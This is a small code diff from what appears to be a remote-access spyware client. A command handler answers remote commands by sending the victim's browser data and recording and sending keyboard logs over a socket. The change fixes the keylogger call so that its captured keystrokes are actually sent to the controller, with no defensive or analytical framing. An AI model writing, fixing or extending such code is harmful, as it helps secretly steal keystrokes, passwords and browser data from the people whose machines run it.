@@ -54,7 +54,7 @@ def command(data):
     elif command == 'browserdata':
         send_browser_data(sio)
     elif command == 'keyboard':
-        record_and_send_keyboard_log(duration=30, sio=None)
+        record_and_send_keyboard_log(duration, sio)
 
 
 def attempt_reconnect():
